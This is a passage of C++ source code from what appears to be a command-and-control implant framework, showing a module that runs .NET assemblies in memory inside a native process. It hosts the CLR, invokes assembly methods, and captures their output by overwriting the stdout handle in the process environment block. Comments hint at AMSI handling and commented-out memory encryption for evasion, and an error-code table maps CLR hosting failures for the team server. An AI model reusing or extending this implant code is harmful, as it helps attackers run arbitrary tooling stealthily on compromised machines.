        processParameters->StandardOutput = consoleHandle;
        return ERROR_INVOKE_METHOD_15;
    }

    DWORD bytesAvailable = 0;
    BOOL res = PeekNamedPipe(m_ioPipeRead, NULL, 0, NULL, &bytesAvailable, NULL);
    if(res && bytesAvailable > 0)
    {
        DWORD outputLength = 0;
        std::string buffer;
        buffer.resize(0x100000);
        if (!ReadFile(m_ioPipeRead, buffer.data(), 0x100000, &outputLength, nullptr)) 
            return -100;
        buffer.resize(outputLength);

        result+=buffer;
    }

    processParameters->StandardOutput = consoleHandle;
    // SetStdHandle(STD_OUTPUT_HANDLE, consoleHandle);

    // encryptMem();

    return 0;
}


// load AMSI
int DotnetExec::invokeMethodDll(const std::string name, const string& method, const string& argument, std::string& result)
{
    bool assemblyFound = false;
    mscorlib::_AssemblyPtr spAssembly=nullptr;
    std::string type;
    for(int i=0; i<m_assemblies.size(); i++)
    {
        if(m_assemblies[i].name==name)
        {
            assemblyFound = true;
            spAssembly = m_assemblies[i].spAssembly;
            type = m_assemblies[i].type;
            break;
        }
    }

    if(!assemblyFound)
    {
        return ERROR_LOAD_ASSEMLBY_5;
    }

    if(spAssembly==nullptr)
        return ERROR_INVOKE_METHOD_11;

    // decryptMem();

    // The .NET class to instantiate.
    bstr_t bstrClassName(type.data());

    // Get the Type of DotnetExecRunner.
    mscorlib::_TypePtr spType;
    HRESULT hr = spAssembly->GetType_2(bstrClassName, &spType);
    if (FAILED(hr) || spType == NULL)
        return ERROR_INVOKE_METHOD_1;

    // Prepare the arguments for the method.
    wstring wCommand(argument.begin(), argument.end());
    variant_t vtStringArg(wCommand.data());
    SAFEARRAY *psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 1);
    LONG index = 0;
    SafeArrayPutElement(psaStaticMethodArgs, &index, &vtStringArg);

    // Invoke the method from the Type interface.
    wstring wMethod(method.begin(), method.end());
    bstr_t bstrStaticMethodName(wMethod.data());
    variant_t vtPSInvokeReturnVal;
    variant_t vtEmpty;

#ifdef _M_IX86 
    PEB_CUSTOM * ProcEnvBlk = (PEB_CUSTOM *) __readfsdword(0x30);
#else
    PEB_CUSTOM * ProcEnvBlk = (PEB_CUSTOM *)__readgsqword(0x60);
#endif
    PRTL_USER_PROCESS_PARAMETERS_CUSTOM processParameters = ProcEnvBlk->ProcessParameters;
    HANDLE consoleHandle = processParameters->StandardOutput;
    processParameters->StandardOutput = m_ioPipeWrite;

    try
    {
        hr = spType->InvokeMember_3(bstrStaticMethodName, static_cast<BindingFlags>(BindingFlags_InvokeMethod | BindingFlags_Static | BindingFlags_Public), 
            NULL, vtEmpty, psaStaticMethodArgs, &vtPSInvokeReturnVal);

        spType->Release();
        SafeArrayDestroy(psaStaticMethodArgs);

        if (FAILED(hr))
        {
            processParameters->StandardOutput = consoleHandle;
            return ERROR_INVOKE_METHOD_2;
        }
    }
    catch (_com_error &e)
    {
        spType->Release();
        // std::cerr << "Exception: " << e.ErrorMessage() << std::endl;
        SafeArrayDestroy(psaStaticMethodArgs);
        processParameters->StandardOutput = consoleHandle;

        return ERROR_INVOKE_METHOD_3;
    }
    catch (...)
    {
        spType->Release();
        // std::cerr << "Exception: unknown" << std::endl;
        SafeArrayDestroy(psaStaticMethodArgs);
        processParameters->StandardOutput = consoleHandle;

        return ERROR_INVOKE_METHOD_4;
    }

    // Get the response
    wstring ws(vtPSInvokeReturnVal.bstrVal);
    std::string str(ws.begin(), ws.end());
    result += str;

    DWORD bytesAvailable = 0;
    BOOL res = PeekNamedPipe(m_ioPipeRead, NULL, 0, NULL, &bytesAvailable, NULL);
    if(res && bytesAvailable > 0)
    {
        DWORD outputLength = 0;
        std::string buffer;
        buffer.resize(0x100000);
        if (!ReadFile(m_ioPipeRead, buffer.data(), 0x100000, &outputLength, nullptr)) 
            return -100;
        buffer.resize(outputLength);

        result+=buffer;
    }

    processParameters->StandardOutput = consoleHandle;
    // SetStdHandle(STD_OUTPUT_HANDLE, consoleHandle);
    
    // encryptMem();

    return 0;
}

#endif


int DotnetExec::errorCodeToMsg(const C2Message &c2RetMessage, std::string& errorMsg)
{
#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS)
    int errorCode = c2RetMessage.errorCode();
    if(errorCode>0)
    {
        if(errorCode==ERROR_INIT_CLR_1)
            errorMsg = "Failed: CLRCreateInstance";
        else if(errorCode==ERROR_INIT_CLR_2)
            errorMsg = "Failed: GetRuntime";
        else if(errorCode==ERROR_INIT_CLR_3)
            errorMsg = "Failed: RuntimeInfo - IsLoadable";
        else if(errorCode==ERROR_INIT_CLR_4)
            errorMsg = "Failed: RuntimeInfo - GetInterface CLRRuntimeHost";
        else if(errorCode==ERROR_INIT_CLR_5)
            errorMsg = "Failed: ClrRuntimeHost - Start";
        else if(errorCode==ERROR_INIT_CLR_6)
            errorMsg = "Failed: RuntimeInfo - GetInterface CorRuntimeHost";
        else if(errorCode==ERROR_INIT_CLR_7)
            errorMsg = "Failed: CorHost - GetDefaultDomain";
        else if(errorCode==ERROR_INIT_CLR_8)
            errorMsg = "Failed: AppDomainThunk - QueryInterface";
        
        else if(errorCode==ERROR_LOAD_ASSEMLBY_1)
            errorMsg = "Failed: IdentityManagerProc";
        else if(errorCode==ERROR_LOAD_ASSEMLBY_2)
            errorMsg = "Failed: IdentityMnaager - GetBindingIdentityFromStream";
        else if(errorCode==ERROR_LOAD_ASSEMLBY_3)
            errorMsg = "Failed: DefaultAppDomain - Load_2";
        else if(errorCode==ERROR_LOAD_ASSEMLBY_4)
            errorMsg = "Failed: DefaultAppDomain - Load_3";
        else if(errorCode==ERROR_LOAD_ASSEMLBY_5)
            errorMsg = "Failed: No module loaded";

        else if(errorCode==ERROR_INVOKE_METHOD_1)
            errorMsg = "Failed: Assembly - GetType_2";
        else if(errorCode==ERROR_INVOKE_METHOD_2)
            errorMsg = "Failed: Type - InvokeMember_3";
        else if(errorCode==ERROR_INVOKE_METHOD_3)
            errorMsg = "Failed: InvokeMember_3 - COM exception";
        else if(errorCode==ERROR_INVOKE_METHOD_4)
            errorMsg = "Failed: InvokeMember_3 - unknown exception";

        else if(errorCode==ERROR_INVOKE_METHOD_11)
            errorMsg = "Failed: Assembly null";
        else if(errorCode==ERROR_INVOKE_METHOD_12)
            errorMsg = "Failed: Assembly - EntryPoint";
        else if(errorCode==ERROR_INVOKE_METHOD_13)
            errorMsg = "Failed: Invoke_3";
        else if(errorCode==ERROR_INVOKE_METHOD_14)
            errorMsg = "Failed: Invoke_3 - COM exception";
        else if(errorCode==ERROR_INVOKE_METHOD_15)
            errorMsg = "Failed: Invoke_3 - unknown exception";

        else
            errorMsg = "Failed: Unknown error";
    }
#endif
    return 0;
}